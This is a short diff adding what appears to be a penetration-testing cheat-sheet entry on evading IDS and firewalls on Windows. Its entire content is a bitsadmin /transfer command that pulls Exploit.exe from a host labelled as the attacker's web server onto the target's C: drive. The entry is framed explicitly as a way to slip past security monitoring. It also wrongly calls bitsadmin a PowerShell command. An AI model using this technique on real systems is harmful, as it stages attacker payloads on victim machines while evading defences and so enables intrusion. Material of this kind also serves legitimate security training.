@@ -1,0 +1,7 @@
+Win-BITS-Admin Evading IDS/Firewall
+
+====================================
+bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe    # powershell command used to evade IDPS/Firewall 
+===================================================================================
+http://10.10.1.13/share/Exploit.exe = attacker machine web-server
+c:\Exploit.exe = saving location
